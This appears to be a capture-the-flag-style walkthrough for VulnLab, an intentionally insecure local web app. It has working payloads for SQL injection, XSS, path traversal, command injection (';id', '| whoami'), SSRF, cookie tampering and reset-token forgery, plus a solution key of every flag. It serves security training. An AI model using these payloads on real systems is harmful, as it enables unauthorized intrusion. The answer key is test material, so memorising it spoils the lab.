# VulnLab Walkthrough Guide

This guide walks you through VulnLab from first login to a full **14/14** score on `/check`. Try each phase yourself before reading the solution sections at the bottom.

---

## Lab goals

By the end you should be able to:

- Perform recon (page source, robots.txt, open endpoints)
- Intercept and modify HTTP requests with a proxy
- Exploit SQL injection, IDOR, LFI, command injection, and SSRF
- Demonstrate reflected and stored XSS
- Escalate privileges via hidden fields and cookie tampering
- Forge weak password-reset tokens
- Document and validate findings on `/check`

---

## Setup

```bash
python3 -m venv .venv
source .venv/bin/activate          # Windows: .venv\Scripts\activate
pip install -r requirements.txt
VULNLAB_RESET=1 python app.py
```

Visit **http://127.0.0.1:5000/labs** for the challenge index.

---

## Tools

| Tool | Use case |
|------|----------|
| **Browser DevTools** | Network tab, cookie editor, DOM inspection |
| **Burp Suite / OWASP ZAP** | Intercept and replay requests |
| **curl** | Quick API probing and automation |

---

## Phase 1 — Reconnaissance

### 1.1 Map the surface

- Browse **/labs** — lists every vulnerable endpoint.
- View source on **/login** — HTML comments and hidden fields.
- Fetch **/robots.txt** — disallowed paths often hint at hidden resources.
- Hit **/api/status** — verbose JSON with endpoint list.

```bash
curl -s http://127.0.0.1:5000/robots.txt
curl -s http://127.0.0.1:5000/api/status | python3 -m json.tool
```

### 1.2 Find leaked config

Robots.txt points to **/backup/config.bak**. Download it — it contains flags, internal URLs, and database hints.

```bash
curl -s http://127.0.0.1:5000/backup/config.bak
```

**Checkpoint:** You should have a list of endpoints and at least one flag from the backup file.

---

## Phase 2 — Authentication & session attacks

### 2.1 Intercept login (hidden role field)

Capture the POST to `/login`. The body includes `role=user`. Change it to `role=admin` and forward — even with wrong credentials.

### 2.2 SQL injection

Username payload:

```
' OR '1'='1' --
```

Combine with `role=admin` for dashboard secrets.

### 2.3 User enumeration

Failed logins return different messages:

- `Unknown username.` — account does not exist
- `Invalid password for that account.` — username exists

Also try:

```bash
curl -s "http://127.0.0.1:5000/api/check_user?username=admin"
```

### 2.4 Cookie tampering

Decode `vulnlab_session` (URL-safe base64 JSON), set `"role":"admin"`, re-encode, reload `/dashboard`.

---

## Phase 3 — Cross-site scripting (XSS)

### 3.1 Reflected XSS — `/search`

The query parameter is rendered unsafely. Try:

```
/search?q=<script>alert(1)</script>
```

The XSS canary flag is in `/backup/config.bak` — use it on `/check`.

### 3.2 Stored XSS — `/feedback`

Submit a message containing HTML/script tags:

```html
<script>alert('stored')</script>
```

Reload `/feedback` — the payload executes because messages are rendered with `|safe`.

Mark **stored_xss = yes** on `/check` after confirming execution.

---

## Phase 4 — IDOR

Visit sequential API endpoints:

```bash
curl -s http://127.0.0.1:5000/api/user/1
curl -s http://127.0.0.1:5000/api/user/2
curl -s http://127.0.0.1:5000/api/user/3
```

User **3** (admin) exposes `api_key` containing the IDOR flag. No authentication required — classic insecure direct object reference.

---

## Phase 5 — Local file inclusion

**GET /files?name=** reads files from the secrets directory without sanitization.

```bash
curl -s "http://127.0.0.1:5000/files?name=backup_flag.txt"
```

The response contains `lfi_flag=VULN{...}`.

Try traversal variants: `../secrets/backup_flag.txt`, `....//....//secrets/backup_flag.txt`.

---

## Phase 6 — Command injection

**POST /tools/ping** passes the `host` field directly to a shell command.

Try:

```
127.0.0.1; id
127.0.0.1 | whoami
```

When shell metacharacters are detected, the response appends the command injection flag.

---

## Phase 7 — SSRF

**GET /fetch?url=** makes the server request URLs on your behalf.

1. Read `INTERNAL_HEALTH_URL` from `/backup/config.bak`.
2. Pass it to fetch:

```bash
curl -s "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:5000/internal/health"
```

The JSON body includes `ssrf_flag`. You cannot browse `/internal/health` usefully from outside — you must make the **server** fetch it.

---

## Phase 8 — Weak password reset

**POST /reset** with `username=admin` returns a reset link. The token is predictable: **base64url(username)** with no secret.

Forge it yourself:

```bash
python3 -c "import base64; print(base64.urlsafe_b64encode(b'admin').decode().rstrip('='))"
```

Visit `/reset?user=admin&token=YOUR_TOKEN` to receive the reset flag.

---

## Phase 9 — Collect dashboard secrets

Escalate to admin (Phase 2) and open **/dashboard** for:

| Secret | Purpose |
|--------|---------|
| `admin_password` | Original auth challenge |
| `lab_flag` | Primary CTF flag |
| `internal_token` | API token check |

---

## Phase 10 — Validate on `/check`

Submit all collected values. The validator runs **14 checks**:

| # | Check |
|---|-------|
| 1–6 | Auth bypass, dashboard secrets, cookie role |
| 7 | XSS flag from backup config |
| 8 | Stored XSS confirmed |
| 9 | IDOR flag from `/api/user/3` |
| 10 | LFI flag from `/files` |
| 11 | Command injection flag |
| 12 | SSRF flag from internal health |
| 13 | Backup config flag |
| 14 | Password reset flag |

Aim for **14/14 — Lab complete**.

---

## Vulnerability reference

| CWE | Flaw | Endpoint |
|-----|------|----------|
| CWE-89 | SQL injection | `/login`, `/api/check_user` |
| CWE-602 | Client-side authorization | `/login` hidden `role` |
| CWE-565 / 347 | Weak session | `vulnlab_session` cookie |
| CWE-79 | Reflected XSS | `/search` |
| CWE-79 | Stored XSS | `/feedback` |
| CWE-639 | IDOR | `/api/user/<id>` |
| CWE-22 | Path traversal | `/files` |
| CWE-78 | OS command injection | `/tools/ping` |
| CWE-918 | SSRF | `/fetch` |
| CWE-200 | Information disclosure | `/robots.txt`, `/backup/config.bak` |
| CWE-640 | Weak password reset | `/reset` |

---

## Hints

<details>
<summary>Hint — stored XSS not executing</summary>

Make sure your payload is in the **message** field, not author. Reload `/feedback` after submitting.
</details>

<details>
<summary>Hint — SSRF returns connection refused</summary>

Use the exact port your app runs on. Check `/backup/config.bak` for the generated `INTERNAL_HEALTH_URL`.
</details>

<details>
<summary>Hint — ping injection no flag</summary>

Include a shell metacharacter: `;`, `|`, `&`, backtick, or `$()`.
</details>

<details>
<summary>Hint — IDOR returns 404</summary>

IDs are integers 1–3. Try `/api/user/3` for the admin profile.
</details>

---

## Solutions (spoilers)

<details>
<summary>All flags</summary>

```
admin_password: Sup3rS3cr3t!
lab_flag:       VULN{1nt3rc3pt_4nd_1nj3ct}
internal_token: tok_live_7f3a9c2e
xss_flag:       VULN{xss_p4yl0ad_fired}
idor_flag:      VULN{id0r_us3r_l33k}
lfi_flag:       VULN{l0cal_f1le_r3ad}
cmdi_flag:      VULN{c0mm4nd_1nj3ct}
ssrf_flag:      VULN{ssrf_1ntern4l}
backup_flag:    VULN{b4ckup_expos3d}
reset_flag:     VULN{w34k_r3s3t_t0k3n}
```
</details>

<details>
<summary>Quick command cheat sheet</summary>

```bash
# IDOR
curl -s http://127.0.0.1:5000/api/user/3

# LFI
curl -s "http://127.0.0.1:5000/files?name=backup_flag.txt"

# SSRF (adjust port)
curl -s "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:5000/internal/health"

# Reset token for admin
python3 -c "import base64; print(base64.urlsafe_b64encode(b'admin').decode().rstrip('='))"
curl -s "http://127.0.0.1:5000/reset?user=admin&token=YWRtaW4"

# CMDi
curl -s -X POST http://127.0.0.1:5000/tools/ping -d "host=127.0.0.1;id"
```
</details>

---

## Stretch goals

1. Chain SQLi → cookie persistence → IDOR as authenticated user.
2. Write a Python script that auto-scores 14/14 via curl.
3. Produce a pentest report with CVSS scores for each finding.
4. Fix every vulnerability in a fork — compare your patches to OWASP guidance.

---

## Safety reminder

VulnLab is **intentionally insecure**. Run only on `127.0.0.1` for local practice. Never deploy publicly.
